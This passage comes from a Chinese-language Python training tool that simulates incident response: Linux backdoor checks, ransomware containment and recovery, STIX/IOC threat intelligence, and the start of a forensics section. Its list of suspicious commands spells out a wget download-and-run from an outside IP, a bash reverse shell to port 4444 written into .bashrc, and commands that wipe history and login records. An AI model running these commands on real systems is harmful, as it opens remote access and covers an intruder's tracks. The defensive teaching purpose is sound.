        print(f"  {'-'*8} {'-'*20} {'-'*20} {'-'*10}")
        for item in 模拟监听:
            标记 = " [!]" if item["状态"] == "可疑" else ""
            print(f"  {item['端口']:<8} {item['地址']:<20} {item['进程']:<20} {item['状态']}{标记}")

        # Shell历史分析
        print("\n  [3] Shell历史分析 (可疑命令):")
        可疑命令 = [
            "wget http://45.155.205.99/shell.sh -O /tmp/.systemd-update",
            "chmod +x /tmp/.systemd-update && /tmp/.systemd-update --daemon",
            "echo 'bash -i >& /dev/tcp/45.155.205.99/4444 0>&1' >> /root/.bashrc",
            "export HISTFILE=/dev/null  # 清除历史记录",
            "dd if=/dev/zero of=/var/log/wtmp bs=1 count=1  # 清除登录记录",
        ]
        for cmd in 可疑命令:
            print(f"    [!] {cmd}")

    def crontab检查(self):
        """检查计划任务后门"""
        print("\n" + "=" * 70)
        print("  Linux Crontab计划任务检查")
        print("=" * 70)

        # 系统crontab
        print("\n  [1] 系统级Crontab (/etc/crontab, /etc/cron.d/):")
        系统cron = [
            {"文件": "/etc/crontab", "计划": "17 * * * *", "命令": "cd / && run-parts --report /etc/cron.hourly", "风险": "低"},
            {"文件": "/etc/cron.d/update", "计划": "*/5 * * * *", "命令": "/tmp/.systemd-update --check", "风险": "高"},
        ]
        for item in 系统cron:
            标记 = " [!]" if item["风险"] == "高" else ""
            print(f"    {item['文件']}: {item['计划']} {item['命令']}{标记}")

        # 用户crontab
        print("\n  [2] 用户级Crontab:")
        print(f"  {'用户':<10} {'计划':<20} {'命令':<50} {'风险'}")
        print(f"  {'-'*10} {'-'*20} {'-'*50} {'-'*6}")
        for item in self.模拟crontab:
            标记 = " [!]" if item["风险"] == "高" else ""
            print(f"  {item['用户']:<10} {item['计划']:<20} {item['命令'][:50]:<50} {item['风险']}{标记}")
            if item["风险"] == "高":
                self.可疑计划任务.append(item)

        # 其他定时任务位置
        print("\n  [3] 其他定时任务位置检查:")
        其他位置 = [
            {"路径": "/etc/cron.hourly/", "发现": "无异常", "风险": "低"},
            {"路径": "/etc/cron.daily/", "发现": "无异常", "风险": "低"},
            {"路径": "/etc/cron.weekly/", "发现": "发现可疑脚本: .update-check", "风险": "高"},
            {"路径": "/var/spool/cron/", "发现": "root用户有反弹shell任务", "风险": "高"},
            {"路径": "/etc/rc.local", "发现": "添加了恶意启动命令", "风险": "高"},
        ]
        for loc in 其他位置:
            标记 = " [!]" if loc["风险"] == "高" else ""
            print(f"    {loc['路径']}: {loc['发现']}{标记}")

        # systemd timer检查
        print("\n  [4] Systemd Timer检查:")
        systemd_timers = [
            {"名称": "system-update.timer", "命令": "/tmp/.systemd-update --daemon", "风险": "高"},
        ]
        for timer in systemd_timers:
            print(f"    [!] {timer['名称']}: {timer['命令']}")

        print(f"\n  >> 总结: 发现 {len(self.可疑计划任务)} 个可疑计划任务")

    def SSH密钥审计(self):
        """审计SSH密钥和登录记录"""
        print("\n" + "=" * 70)
        print("  Linux SSH密钥审计与登录分析")
        print("=" * 70)

        # authorized_keys审计
        print("\n  [1] authorized_keys密钥审计:")
        print(f"  {'用户':<10} {'密钥类型':<15} {'指纹':<25} {'注释':<25} {'最后登录':<15} {'风险'}")
        print(f"  {'-'*10} {'-'*15} {'-'*25} {'-'*25} {'-'*15} {'-'*6}")
        for key in self.模拟SSH密钥:
            标记 = " [!]" if key["风险"] == "高" else ""
            print(f"  {key['用户']:<10} {key['密钥类型']:<15} {key['指纹']:<25} {key['注释']:<25} {key['最后登录']:<15} {key['风险']}{标记}")
            if key["风险"] == "高":
                self.可疑密钥.append(key)

        # 登录记录分析
        print("\n  [2] SSH登录记录分析 (/var/log/auth.log):")
        print(f"  {'时间':<22} {'用户':<10} {'来源IP':<20} {'认证方式':<12} {'状态'}")
        print(f"  {'-'*22} {'-'*10} {'-'*20} {'-'*12} {'-'*8}")
        for rec in self.模拟登录记录:
            标记 = ""
            if "45.155.205.99" in rec.get("来源IP", ""):
                标记 = " [!]"
                self.可疑登录.append(rec)
            print(f"  {rec['时间']:<22} {rec['用户']:<10} {rec['来源IP']:<20} {rec['方式']:<12} {rec['状态']}{标记}")

        # 异常登录分析
        print("\n  [3] 异常登录分析:")
        分析结果 = [
            "01:00:45 root用户从 45.155.205.99 通过密钥登录 [!] 异常时间+异常IP",
            "01:15:35 admin用户从 45.155.205.99 登录成功 [!] 密码可能已泄露",
            "02:30:00 root用户再次从 45.155.205.99 登录 [!] 持续异常访问",
        ]
        for 分析 in 分析结果:
            print(f"    {分析}")

        # SSH配置检查
        print("\n  [4] SSH配置安全检查 (/etc/ssh/sshd_config):")
        ssh配置 = [
            {"配置项": "PermitRootLogin", "当前值": "yes", "建议值": "no", "风险": "中"},
            {"配置项": "PasswordAuthentication", "当前值": "yes", "建议值": "no", "风险": "中"},
            {"配置项": "MaxAuthTries", "当前值": "6", "建议值": "3", "风险": "低"},
            {"配置项": "AllowUsers", "当前值": "未设置", "建议值": "指定用户", "风险": "中"},
        ]
        print(f"  {'配置项':<30} {'当前值':<15} {'建议值':<15} {'风险'}")
        print(f"  {'-'*30} {'-'*15} {'-'*15} {'-'*6}")
        for cfg in ssh配置:
            print(f"  {cfg['配置项']:<30} {cfg['当前值']:<15} {cfg['建议值']:<15} {cfg['风险']}")

    def rootkit检测(self):
        """检测rootkit"""
        print("\n" + "=" * 70)
        print("  Linux Rootkit检测")
        print("=" * 70)

        # 内核模块检查
        print("\n  [1] 内核模块检查 (lsmod):")
        内核模块 = [
            {"模块名": "nfsd", "大小": 471040, "用途": "NFS服务", "风险": "低"},
            {"模块名": "ipv6", "大小": 40960, "用途": "IPv6协议", "风险": "低"},
            {"模块名": "rootkit_hidden", "大小": 16384, "用途": "未知/隐藏模块", "风险": "高"},
            {"模块名": "network_hook", "大小": 8192, "用途": "网络钩子/嗅探", "风险": "高"},
        ]
        print(f"  {'模块名':<20} {'大小':<10} {'用途':<25} {'风险'}")
        print(f"  {'-'*20} {'-'*10} {'-'*25} {'-'*6}")
        for mod in 内核模块:
            标记 = " [!]" if mod["风险"] == "高" else ""
            print(f"  {mod['模块名']:<20} {mod['大小']:<10} {mod['用途']:<25} {mod['风险']}{标记}")

        # 隐藏进程检测
        print("\n  [2] 隐藏进程检测 (对比 /proc 与 ps):")
        print("    扫描/proc目录PID...")
        print("    对比ps命令输出...")
        print("    [!] 发现隐藏PID: 6666 (不在ps输出中)")
        print("    [!] 发现隐藏PID: 7777 (不在ps输出中)")
        print("    隐藏进程可能由rootkit隐藏，需要进一步分析")

        # 系统二进制文件完整性检查
        print("\n  [3] 系统二进制文件完整性检查 (rpm -Va / debsums):")
        完整性结果 = [
            {"文件": "/bin/ls", "状态": "已修改", "原始MD5": "a1b2c3d4e5f6", "当前MD5": "f6e5d4c3b2a1", "风险": "高"},
            {"文件": "/bin/ps", "状态": "已修改", "原始MD5": "b2c3d4e5f6a1", "当前MD5": "a1f6e5d4c3b2", "风险": "高"},
            {"文件": "/bin/netstat", "状态": "已修改", "原始MD5": "c3d4e5f6a1b2", "当前MD5": "b2a1f6e5d4c3", "风险": "高"},
            {"文件": "/bin/login", "状态": "正常", "原始MD5": "d4e5f6a1b2c3", "当前MD5": "d4e5f6a1b2c3", "风险": "低"},
            {"文件": "/usr/bin/sshd", "状态": "已修改", "原始MD5": "e5f6a1b2c3d4", "当前MD5": "c3b2a1f6e5d4", "风险": "高"},
        ]
        print(f"  {'文件':<20} {'状态':<10} {'原始MD5':<15} {'当前MD5':<15} {'风险'}")
        print(f"  {'-'*20} {'-'*10} {'-'*15} {'-'*15} {'-'*6}")
        for item in 完整性结果:
            标记 = " [!]" if item["风险"] == "高" else ""
            print(f"  {item['文件']:<20} {item['状态']:<10} {item['原始MD5']:<15} {item['当前MD5']:<15} {item['风险']}{标记}")

        # LD_PRELOAD检测
        print("\n  [4] LD_PRELOAD后门检测:")
        print("    检查环境变量 LD_PRELOAD...")
        print("    [!] /etc/ld.so.preload 包含: /lib/x86_64-linux-gnu/libhacker.so")
        print("    [!] 该库文件会劫持ls、ps、netstat等命令的输出")
        print("    建议: 删除 /etc/ld.so.preload 中的恶意条目")

        # 检测总结
        print("\n  >> Rootkit检测总结:")
        print("    检测到疑似用户态Rootkit (LD_PRELOAD类型)")
        print("    多个系统二进制文件被篡改 (ls, ps, netstat, sshd)")
        print("    发现2个隐藏进程和2个可疑内核模块")
        print("    建议: 从可信介质启动后进行清除，必要时重装系统")


# =============================================================================
# 第四部分：勒索软件应急响应
# =============================================================================

class 勒索软件应急响应器:
    """
    勒索软件应急响应工具模拟。
    
    包含：
    - 加密行为检测：文件系统监控、加密特征识别
    - 传播遏制：网络隔离、共享关闭
    - 恢复方案：备份恢复、解密尝试
    """

    # 模拟的加密文件特征
    加密文件特征 = {
        ".encrypted": "未知勒索软件",
        ".locky": "Locky家族",
        ".crypted": "Cryptolocker家族",
        ".wcry": "WannaCry家族",
        ".ryuk": "Ryuk家族",
        ".conti": "Conti家族",
    }

    # 模拟的文件系统活动
    文件系统活动 = [
        {"时间": "03:01:15", "文件": "D:\\documents\\report.docx", "操作": "读取", "大小": 250000, "可疑": False},
        {"时间": "03:01:16", "文件": "D:\\documents\\report.docx.encrypted", "操作": "创建", "大小": 250256, "可疑": True},
        {"时间": "03:01:16", "文件": "D:\\documents\\report.docx", "操作": "删除", "大小": 0, "可疑": True},
        {"时间": "03:01:17", "文件": "D:\\documents\\budget.xlsx", "操作": "读取", "大小": 180000, "可疑": False},
        {"时间": "03:01:18", "文件": "D:\\documents\\budget.xlsx.encrypted", "操作": "创建", "大小": 180256, "可疑": True},
        {"时间": "03:01:18", "文件": "D:\\documents\\budget.xlsx", "操作": "删除", "大小": 0, "可疑": True},
    ]

    # 模拟的勒索说明文件
    勒索说明 = {
        "文件名": "HOW_TO_DECRYPT.txt",
        "内容": "你的文件已被加密。要恢复文件，请支付0.5 BTC到以下地址: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa。联系: decrypt@onionmail.org",
        "BTC地址": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "联系邮箱": "decrypt@onionmail.org",
        "支付期限": "72小时",
    }

    def __init__(self):
        self.加密文件列表 = []
        self.勒索软件家族 = None
        self.受影响范围 = 0

    def 加密行为检测(self):
        """检测文件加密行为"""
        print("\n" + "=" * 70)
        print("  勒索软件加密行为检测")
        print("=" * 70)

        # 文件系统活动分析
        print("\n  [1] 文件系统活动监控:")
        print(f"  {'时间':<12} {'操作':<8} {'文件名':<45} {'大小':<12} {'可疑'}")
        print(f"  {'-'*12} {'-'*8} {'-'*45} {'-'*12} {'-'*6}")
        for activity in self.文件系统活动:
            可疑标记 = " [!]" if activity.get("可疑") else ""
            print(f"  {activity['时间']:<12} {activity['操作']:<8} {activity['文件'][:45]:<45} {activity['大小']:<12} {'是' if activity.get('可疑') else '否'}{可疑标记}")

        # 加密模式识别
        print("\n  [2] 加密模式识别:")
        加密模式 = [
            "模式1: 原文件读取→加密文件创建→原文件删除 (经典勒索软件行为)",
            "模式2: 加密文件扩展名为 .encrypted",
            "模式3: 每个目录创建 HOW_TO_DECRYPT.txt 勒索说明文件",
            "模式4: 高速文件操作 (每秒处理多个文件)",
        ]
        for 模式 in 加密模式:
            print(f"    {模式}")

        # 勒索软件家族识别
        print("\n  [3] 勒索软件家族识别:")
        扩展名 = ".encrypted"
        self.勒索软件家族 = self.加密文件特征.get(扩展名, "未知")
        print(f"    文件扩展名: {扩展名}")
        print(f"    识别结果: {self.勒索软件家族}")

        # 勒索说明文件分析
        print("\n  [4] 勒索说明文件分析:")
        说明 = self.勒索说明
        print(f"    文件名: {说明['文件名']}")
        print(f"    内容: {说明['内容']}")
        print(f"    BTC地址: {说明['BTC地址']}")
        print(f"    联系邮箱: {说明['联系邮箱']}")
        print(f"    支付期限: {说明['支付期限']}")
        print(f"    >> 分析: BTC地址可用于链上追踪，邮箱可关联其他受害案例")

        # 加密速度统计
        print("\n  [5] 加密速度统计:")
        统计 = {
            "已加密文件数": 1583,
            "受影响目录数": 47,
            "受影响磁盘": ["C:", "D:", "E:"],
            "加密开始时间": "03:01:15",
            "加密结束时间": "03:05:42",
            "总耗时": "4分27秒",
            "平均速度": "约6个文件/秒",
        }
        for key, value in 统计.items():
            print(f"    {key}: {value}")

        self.受影响范围 = 统计["已加密文件数"]
        print(f"\n  >> 检测结果: 确认勒索软件攻击，家族: {self.勒索软件家族}")
        print(f"     已加密 {self.受影响范围} 个文件，需立即启动应急响应")

    def 传播遏制(self):
        """遏制勒索软件传播"""
        print("\n" + "=" * 70)
        print("  勒索软件传播遏制")
        print("=" * 70)

        # 紧急遏制措施
        print("\n  [1] 紧急遏制措施:")
        遏制措施 = [
            ("断开网络", "立即断开受感染主机的所有网络连接", "已执行", "阻止网络传播"),
            ("关闭SMB", "禁用SMBv1/v2，阻止通过共享传播", "已执行", "阻断WannaCry类传播"),
            ("禁用RDP", "关闭远程桌面服务", "已执行", "阻止RDP横向移动"),
            ("隔离主机", "将受感染主机移至隔离VLAN", "已执行", "物理网络隔离"),
            ("关闭共享", "禁用所有文件共享", "已执行", "阻止文件服务器感染"),
            ("账户锁定", "锁定相关服务账户", "已执行", "阻止凭据滥用"),
        ]
        for 措施, 描述, 状态, 目的 in 遏制措施:
            print(f"    [{状态}] {措施}")
            print(f"           描述: {描述}")
            print(f"           目的: {目的}")

        # 网络传播路径分析
        print("\n  [2] 传播路径分析:")
        传播路径 = [
            "初始感染: 用户打开钓鱼邮件附件 -> 勒索软件执行",
            "本地传播: 通过USB设备 -> 感染其他主机",
            "网络传播: 通过SMB共享 -> 加密文件服务器",
            "横向移动: 通过RDP -> 感染域内其他服务器",
            "域传播: 获取域管理员凭据 -> 批量感染域内主机",
        ]
        for i, path in enumerate(传播路径, 1):
            print(f"    {i}. {path}")

        # 影响范围评估
        print("\n  [3] 影响范围评估:")
        影响评估 = {
            "受感染主机": 3,
            "受影响用户": 45,
            "加密文件总数": 4749,
            "受影响业务系统": ["文件服务器", "财务系统", "OA系统"],
            "数据恢复可能性": "部分可通过备份恢复",
            "预计恢复时间": "24-48小时",
        }
        for key, value in 影响评估.items():
            print(f"    {key}: {value}")

        # 遏制效果验证
        print("\n  [4] 遏制效果验证:")
        验证项 = [
            ("网络传播", "已阻断，无新增感染", "通过"),
            ("SMB传播", "已关闭SMB，无新增感染", "通过"),
            ("RDP传播", "已禁用RDP，无新增感染", "通过"),
            ("USB传播", "已禁止USB，无新增感染", "通过"),
        ]
        for 检测项, 结果, 状态 in 验证项:
            print(f"    {检测项}: {结果} [{状态}]")

        print(f"\n  >> 遏制完成，传播已阻断")

    def 恢复方案(self):
        """制定和执行恢复方案"""
        print("\n" + "=" * 70)
        print("  勒索软件恢复方案")
        print("=" * 70)

        # 恢复选项评估
        print("\n  [1] 恢复选项评估:")
        恢复选项 = [
            {
                "选项": "备份恢复",
                "可行性": "高",
                "条件": "存在未受感染的离线备份",
                "预计时间": "4-8小时",
                "数据完整性": "完整",
                "推荐": "是",
            },
            {
                "选项": "解密工具恢复",
                "可行性": "中",
                "条件": "存在公开解密工具 (如NoMoreRansom.org)",
                "预计时间": "2-4小时",
                "数据完整性": "完整",
                "推荐": "视情况",
            },
            {
                "选项": "支付赎金",
                "可行性": "不推荐",
                "条件": "无备份且数据极其重要",
                "预计时间": "24-72小时",
                "数据完整性": "不保证",
                "推荐": "否",
            },
            {
                "选项": "数据重建",
                "可行性": "低",
                "条件": "有原始数据来源可重新生成",
                "预计时间": "数天-数周",
                "数据完整性": "部分",
                "推荐": "否",
            },
        ]

        for opt in 恢复选项:
            print(f"\n    选项: {opt['选项']}")
            print(f"    可行性: {opt['可行性']}")
            print(f"    条件: {opt['条件']}")
            print(f"    预计时间: {opt['预计时间']}")
            print(f"    数据完整性: {opt['数据完整性']}")
            推荐 = "推荐" if opt["推荐"] == "是" else ("不推荐" if opt["推荐"] == "否" else "视情况")
            print(f"    推荐: {推荐}")

        # 备份恢复执行
        print("\n  [2] 备份恢复执行 (推荐方案):")
        恢复步骤 = [
            ("验证备份", "检查备份完整性和可用性", "完成"),
            ("环境准备", "准备干净恢复环境，确保无残留", "完成"),
            ("数据恢复", "从备份恢复数据到干净系统", "进行中"),
            ("完整性验证", "验证恢复数据的完整性和一致性", "待执行"),
            ("服务恢复", "逐步恢复业务服务", "待执行"),
            ("加固措施", "安装补丁、更新防护规则", "待执行"),
        ]
        for 步骤, 描述, 状态 in 恢复步骤:
            print(f"    [{状态}] {步骤}: {描述}")

        # 解密工具检查
        print("\n  [3] 解密工具可用性检查:")
        解密工具库 = [
            {"家族": "WannaCry", "可用": True, "来源": "NoMoreRansom.org", "说明": "WannaKey可恢复部分版本"},
            {"家族": "Petya/NotPetya", "可用": False, "来源": "N/A", "说明": "NotPetya无法解密"},
            {"家族": " GandCrab", "可用": True, "来源": "Bitdefender", "说明": "可解密部分版本"},
            {"家族": "未知(.encrypted)", "可用": False, "来源": "N/A", "说明": "未找到匹配的解密工具"},
        ]
        print(f"  {'家族':<20} {'可用':<8} {'来源':<20} {'说明'}")
        print(f"  {'-'*20} {'-'*8} {'-'*20} {'-'*30}")
        for tool in 解密工具库:
            可用 = "是" if tool["可用"] else "否"
            print(f"  {tool['家族']:<20} {可用:<8} {tool['来源']:<20} {tool['说明']}")

        # 赎金支付风险评估
        print("\n  [4] 赎金支付风险评估 (不推荐):")
        风险 = [
            "支付后可能仍无法解密",
            "支付会资助犯罪活动",
            "可能被标记为愿意支付的目标，遭受重复攻击",
            "违反公司安全政策和法律法规",
            "无法保证数据未被窃取",
            "BTC交易可追踪但仍存在混币风险",
        ]
        for i, r in enumerate(风险, 1):
            print(f"    {i}. {r}")

        print(f"\n  >> 恢复方案: 推荐使用备份恢复，预计4-8小时完成")


# =============================================================================
# 第五部分：威胁情报处理
# =============================================================================

class 威胁情报处理器:
    """
    威胁情报处理工具模拟。
    
    包含：
    - STIX/TAXII数据解析
    - IOC提取与匹配
    - 威胁情报报告生成
    """

    # 模拟的STIX 2.1数据
    模拟STIX数据 = {
        "type": "bundle",
        "id": "bundle--a1b2c3d4-e5f6-7890-abcd-ef1234567890",
        "objects": [
            {
                "type": "indicator",
                "id": "indicator--12345678-1234-5678-1234-567890abcdef",
                "name": "Malicious C2 IP Address",
                "description": "Known C2 server for Emotet malware",
                "pattern": "[ipv4-addr:value = '45.155.205.99']",
                "pattern_type": "stix",
                "valid_from": "2026-08-15T00:00:00Z",
                "labels": ["malicious-activity", "command-and-control"],
                "kill_chain_phases": [
                    {"kill_chain_name": "lockheed-martin-cyber-kill-chain", "phase_name": "command-and-control"}
                ],
            },
            {
                "type": "indicator",
                "id": "indicator--87654321-4321-8765-4321-fedcba098765",
                "name": "Malware Hash - Emotet Loader",
                "description": "SHA256 hash of Emotet loader binary",
                "pattern": "[file:hashes.'SHA-256' = 'a3f5b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a']",
                "pattern_type": "stix",
                "valid_from": "2026-09-01T00:00:00Z",
                "labels": ["malicious-activity"],
            },
            {
                "type": "malware",
                "id": "malware--abcdef01-2345-6789-abcd-ef0123456789",
                "name": "Emotet",
                "description": "Emotet banking trojan, evolved into modular malware delivery platform",
                "malware_types": ["trojan", "dropper"],
                "is_family": True,
                "kill_chain_phases": [
                    {"kill_chain_name": "lockheed-martin-cyber-kill-chain", "phase_name": "exploitation"}
                ],
            },
            {
                "type": "attack-pattern",
                "id": "attack-pattern--11111111-2222-3333-4444-555555555555",
                "name": "Spear Phishing Attachment",
                "description": "Spear phishing via attachment",
                "external_references": [
                    {"source_name": "mitre-attack", "external_id": "T1566.001", "url": "https://attack.mitre.org/techniques/T1566/001"}
                ],
            },
            {
                "type": "threat-actor",
                "id": "threat-actor--99999999-8888-7777-6666-555555555555",
                "name": "APT28 (Fancy Bear)",
                "description": "Russian threat actor group",
                "threat_actor_types": ["nation-state"],
                "country": "Russia",
            },
        ],
    }

    def __init__(self):
        self.情报对象列表 = []
        self.IOC列表 = []
        self.匹配结果 = []

    def STIX数据解析(self):
        """解析STIX 2.1格式威胁情报数据"""
        print("\n" + "=" * 70)
        print("  STIX 2.1 威胁情报数据解析")
        print("=" * 70)

        数据 = self.模拟STIX数据
        print(f"\n  Bundle ID: {数据['id']}")
        print(f"  对象数量: {len(数据['objects'])}")

        # 按类型分类解析
        类型统计 = defaultdict(int)
        for obj in 数据["objects"]:
            类型统计[obj["type"]] += 1
            self.情报对象列表.append(obj)

        print(f"\n  >> 对象类型统计:")
        for obj_type, count in 类型统计.items():
            print(f"    {obj_type}: {count}")

        # 逐对象解析
        print(f"\n  >> 对象详情解析:")
        for obj in 数据["objects"]:
            print(f"\n  [{'='*40}")
            print(f"  类型: {obj['type']}")
            print(f"  ID: {obj['id']}")
            print(f"  名称: {obj.get('name', 'N/A')}")

            if obj["type"] == "indicator":
                print(f"  描述: {obj.get('description', 'N/A')}")
                print(f"  模式: {obj.get('pattern', 'N/A')}")
                print(f"  有效期: {obj.get('valid_from', 'N/A')}")
                print(f"  标签: {obj.get('labels', [])}")
                if "kill_chain_phases" in obj:
                    for phase in obj["kill_chain_phases"]:
                        print(f"  杀伤链阶段: {phase['phase_name']}")

            elif obj["type"] == "malware":
                print(f"  描述: {obj.get('description', 'N/A')}")
                print(f"  类型: {obj.get('malware_types', [])}")
                print(f"  是否家族: {obj.get('is_family', False)}")

            elif obj["type"] == "attack-pattern":
                print(f"  描述: {obj.get('description', 'N/A')}")
                for ref in obj.get("external_references", []):
                    print(f"  外部引用: {ref['source_name']} - {ref['external_id']}")
                    print(f"  URL: {ref.get('url', 'N/A')}")

            elif obj["type"] == "threat-actor":
                print(f"  描述: {obj.get('description', 'N/A')}")
                print(f"  类型: {obj.get('threat_actor_types', [])}")
                print(f"  国家: {obj.get('country', 'N/A')}")

    def IOC提取与匹配(self):
        """提取IOC并与本地数据进行匹配"""
        print("\n" + "=" * 70)
        print("  IOC提取与匹配")
        print("=" * 70)

        # IOC提取
        print("\n  [1] 从STIX数据中提取IOC:")
        提取规则 = {
            "ipv4-addr": r"ipv4-addr:value\s*=\s*'([^']+)'",
            "domain": r"domain-name:value\s*=\s*'([^']+)'",
            "SHA-256": r"hashes\.'SHA-256'\s*=\s*'([^']+)'",
            "MD5": r"hashes\.'MD5'\s*=\s*'([^']+)'",
            "url": r"url:value\s*=\s*'([^']+)'",
            "email": r"email-addr:value\s*=\s*'([^']+)'",
        }

        for obj in self.情报对象列表:
            if obj["type"] == "indicator" and "pattern" in obj:
                pattern = obj["pattern"]
                for ioc类型, 正则 in 提取规则.items():
                    matches = re.findall(正则, pattern)
                    for match in matches:
                        ioc = {"类型": ioc类型, "值": match, "来源": obj["name"], "描述": obj.get("description", "")}
                        self.IOC列表.append(ioc)
                        print(f"    [{ioc类型}] {match}")
                        print(f"      来源: {obj['name']}")
                        print(f"      描述: {obj.get('description', 'N/A')}")

        # 本地数据匹配
        print(f"\n  [2] IOC与本地数据匹配:")
        本地数据 = [
            {"类型": "ipv4-addr", "值": "45.155.205.99", "来源": "防火墙日志", "时间": "2026-09-11 01:00"},
            {"类型": "ipv4-addr", "值": "192.168.1.50", "来源": "内部资产", "时间": "N/A"},
            {"类型": "SHA-256", "值": "a3f5b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a", "来源": "EDR检测", "时间": "2026-09-11 03:00"},
            {"类型": "domain", "值": "malware-c2.evil.com", "来源": "DNS日志", "时间": "2026-09-11 02:30"},
        ]

        for ioc in self.IOC列表:
            for local in 本地数据:
                if ioc["值"] == local["值"]:
                    匹配 = {
                        "IOC类型": ioc["类型"],
                        "IOC值": ioc["值"],
                        "情报来源": ioc["来源"],
                        "本地来源": local["来源"],
                        "匹配时间": local["时间"],
                        "状态": "匹配成功",
                    }
                    self.匹配结果.append(匹配)
                    print(f"\n    [!] 匹配成功!")
                    print(f"    IOC类型: {ioc['类型']}")
                    print(f"    IOC值: {ioc['值']}")
                    print(f"    情报来源: {ioc['来源']}")
                    print(f"    本地来源: {local['来源']}")
                    print(f"    检测时间: {local['时间']}")

        # 匹配统计
        print(f"\n  [3] 匹配统计:")
        print(f"    总IOC数量: {len(self.IOC列表)}")
        print(f"    匹配成功: {len(self.匹配结果)}")
        print(f"    匹配率: {len(self.匹配结果)/max(len(self.IOC列表),1)*100:.1f}%")

        # 风险评估
        if self.匹配结果:
            print(f"\n  [4] 风险评估:")
            print(f"    [!] 检测到与已知威胁情报匹配的IOC")
            print(f"    威胁等级: 高")
            print(f"    建议: 立即调查匹配项相关的系统活动")

    def 威胁情报报告生成(self):
        """生成威胁情报报告"""
        print("\n" + "=" * 70)
        print("  威胁情报报告")
        print("=" * 70)

        报告时间 = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(f"""
  ════════════════════════════════════════════════════════════════
                     威胁情报分析报告
  ════════════════════════════════════════════════════════════════

  报告时间: {报告时间}
  报告编号: TI-2026-0911-001
  分析师: 自动化威胁情报平台

  一、威胁概述
  {'-'*50}
  本次分析共处理 {len(self.情报对象列表)} 个威胁情报对象，
  提取 {len(self.IOC列表)} 个IOC指标，
  其中 {len(self.匹配结果)} 个IOC与本地数据匹配成功。

  二、威胁对象详情
  {'-'*50}""")

        # 输出威胁对象
        for obj in self.情报对象列表:
            if obj["type"] == "malware":
                print(f"""
  恶意软件: {obj.get('name', 'N/A')}
    描述: {obj.get('description', 'N/A')}
    类型: {', '.join(obj.get('malware_types', []))}
    家族: {'是' if obj.get('is_family') else '否'}""")

            elif obj["type"] == "threat-actor":
                print(f"""
  威胁行为者: {obj.get('name', 'N/A')}
    描述: {obj.get('description', 'N/A')}
    类型: {', '.join(obj.get('threat_actor_types', []))}
    来源国家: {obj.get('country', 'N/A')}""")

            elif obj["type"] == "attack-pattern":
                for ref in obj.get("external_references", []):
                    print(f"""
  攻击模式: {obj.get('name', 'N/A')}
    描述: {obj.get('description', 'N/A')}
    MITRE ATT&CK: {ref.get('external_id', 'N/A')}
    参考: {ref.get('url', 'N/A')}""")

        print(f"""
  三、IOC指标列表
  {'-'*50}""")
        for ioc in self.IOC列表:
            print(f"  [{ioc['类型']}] {ioc['值']}")
            print(f"    来源: {ioc['来源']}")

        print(f"""
  四、匹配结果
  {'-'*50}""")
        if self.匹配结果:
            for 匹配 in self.匹配结果:
                print(f"  [!] {匹配['IOC类型']}: {匹配['IOC值']}")
                print(f"    情报来源: {匹配['情报来源']}")
                print(f"    本地来源: {匹配['本地来源']}")
                print(f"    检测时间: {匹配['匹配时间']}")
        else:
            print("  无匹配结果")

        print(f"""
  五、建议措施
  {'-'*50}
  1. 阻断已匹配的恶意IP地址和域名
  2. 在EDR中添加恶意文件哈希检测规则
  3. 加强对相关攻击模式的检测和告警
  4. 持续关注该威胁行为者的活动动态
  5. 定期更新威胁情报数据库

  ════════════════════════════════════════════════════════════════
  报告结束
  ════════════════════════════════════════════════════════════════""")


# =============================================================================
# 第六部分：数字取证工具
# =============================================================================

class 数字取证工具集:
    """
    数字取证工具集模拟。
    
    包含：
    - 磁盘镜像校验：哈希校验保证证据完整性
    - 内存取证分析：进程、网络连接、注册表提取
    - 时间线构建：文件系统时间线分析
    """

    # 模拟的磁盘镜像信息
    模拟磁盘镜像 = {
        "镜像文件": "evidence_disk_001.dd",
        "原始大小": "500107862016 bytes (465.76 GiB)",
        "获取时间": "2026-09-11 04:30:00",
        "获取工具": "dc3dd (GNU dd fork with hashing)",
        "获取人员": "取证分析师 - 张三",
        "MD5": "d41d8cd98f00b204e9800998ecf8427e",
        "SHA1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
        "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    }

    # 模拟的内存分析结果
    模拟内存分析 = {
        "镜像文件": "memory_dump_001.raw",
        "内存大小": "8589934592 bytes (8 GiB)",
        "系统版本": "Windows 10 Pro 19042.1165",
        "获取时间": "2026-09-11 04:25:00",
        "进程列表": [
            {"PID": 4, "PPID": 0, "名称": "System", "偏移": "0xfa8001234abc", "线程数": 152, "句柄数": 987},
            {"PID": 612, "PPID": 504, "名称": "lsass.exe", "偏移": "0xfa8005678def", "线程数": 12, "句柄数": 654},
            {"PID": 2048, "PPID": 856, "名称": "svchost_helper.exe", "偏移": "0xfa8009abc123", "线程数": 3, "句柄数": 45},
            {"PID": 4096, "PPID": 3072, "名称": "mimikatz.exe", "偏移": "0xfa800def4567", "线程数": 1, "句柄数": 23},
        ],
        "网络连接": [
            {"协议": "TCP", "本地": "0.0.0.0:135", "远程": "*:*", "状态": "LISTEN", "PID": 856, "偏移": "0xfa801aaa"},
            {"协议": "TCP", "本地": "192.168.1.50:49200", "远程": "45.155.205.99:443", "状态": "ESTABLISHED", "PID": 2048, "偏移": "0xfa801bbb"},
        ],
        "注册表蜂巢": [
            {"名称": "SYSTEM", "偏移": "0x3a7d0000", "大小": "12582912", "描述": "系统配置"},
            {"名称": "SOFTWARE", "偏移": "0x3b7d0000", "大小": "67108864", "描述": "软件配置"},
            {"名称": "SAM", "偏移": "0x3c7d0000", "大小": "524288", "描述": "安全账户管理"},
            {"名称": "NTUSERDAT", "偏移": "0x3d7d0000", "大小": "2097152", "描述": "用户配置"},
        ],
    }

    # 模拟的文件系统时间线
    模拟时间线数据 = [
        {"时间": "2026-09-10 14:00:00", "文件": "C:\\Users\\user\\Desktop\\invoice.xlsx", "操作": "创建", "MACB": "M---", "来源": "文件系统"},
        {"时间": "2026-09-10 16:30:00", "文件": "C:\\Users\\user\\Desktop\\invoice.xlsx", "操作": "修改", "MACB": "-A--", "来源": "文件系统"},
